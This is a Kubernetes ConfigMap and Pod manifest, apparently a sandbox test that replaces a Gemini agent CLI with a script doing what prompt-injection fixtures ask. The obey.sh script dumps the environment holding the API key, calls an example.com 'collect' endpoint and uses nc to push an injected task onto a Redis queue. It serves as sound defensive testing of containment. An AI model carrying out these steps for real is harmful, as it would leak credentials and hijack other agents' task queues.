# "What if the model had obeyed": the agent container with the same image, labels (so the same network
# rules), Secret and wrapper as a Gemini task pod, but the CLI replaced by a script that does exactly what
# the injection fixtures ask for. No model call. Run and read by tests/obedient-agent.sh, then deleted.
apiVersion: v1
kind: ConfigMap
metadata: {name: obedient-agent, namespace: agents}
data:
  obey.sh: |
    sleep 3   # act after Tetragon has picked up the new container (see the threat model)
    echo "== step 1: env"
    env
    echo "CANARY-ENV"
    echo "== step 2: request to example.com"
    wget -q -T 5 -O - "https://example.com/collect?from=tiny-notes" 2>&1 | head -c 300; echo " (wget exit $?)"
    echo "CANARY-NET"
    echo "== step 3: RPUSH queue:gemini on Redis (no password in this container)"
    printf 'RPUSH queue:gemini injected-task\r\nQUIT\r\n' | nc -w 5 redis.agents.svc.cluster.local 6379
    echo "CANARY-REDIS"
    echo "CANARY-OBEYED"
  task.json: |
    {"id": "t-obedient-agent", "instruction": "(stand-in, no model)", "repo": null}
---
apiVersion: v1
kind: Pod
metadata:
  name: obedient-agent
  namespace: agents
  labels: {agent-sandbox/redis-client: "true", agent-sandbox/runner: gemini}
spec:
  restartPolicy: Never
  automountServiceAccountToken: false
  enableServiceLinks: false
  dnsConfig: {options: [{name: ndots, value: "1"}]}
  nodeSelector: {kubernetes.io/hostname: worker-1}
  securityContext: {runAsNonRoot: true, runAsUser: 1000, runAsGroup: 1000, fsGroup: 1000, seccompProfile: {type: RuntimeDefault}}
  initContainers:
  - name: take
    image: ghcr.io/miracaral/k8s-agent-sandbox-runner-gemini:0.1.2
    imagePullPolicy: IfNotPresent
    command: ["cp", "/fixture/task.json", "/workspace/task.json"]
    securityContext: {allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: {drop: ["ALL"]}}
    volumeMounts: [{name: workspace, mountPath: /workspace}, {name: fixture, mountPath: /fixture}]
  containers:
  - name: agent
    image: ghcr.io/miracaral/k8s-agent-sandbox-runner-gemini:0.1.2
    imagePullPolicy: IfNotPresent
    # The real wrapper runs the script in place of the CLI, so its output goes through the same key masking.
    command: ["sh", "-c", "node /usr/local/bin/run-task.mjs; echo \"exit_code=$(cat /workspace/out/exit_code) key_found=$(cat /workspace/out/key_found)\"; cat /workspace/out/summary.txt"]
    env:
    - {name: HOME, value: /tmp/home}
    - {name: AGENT_CMD, value: "sh /fixture/obey.sh"}
    - name: GEMINI_API_KEY
      valueFrom: {secretKeyRef: {name: gemini-api, key: api-key}}
    resources: {limits: {cpu: 500m, memory: 256Mi}}
    securityContext: {allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: {drop: ["ALL"]}}
    volumeMounts: [{name: workspace, mountPath: /workspace}, {name: fixture, mountPath: /fixture}, {name: tmp, mountPath: /tmp}]
  volumes:
  - {name: workspace, emptyDir: {sizeLimit: 16Mi}}
  - {name: tmp, emptyDir: {sizeLimit: 16Mi}}
  - name: fixture
    configMap: {name: obedient-agent}
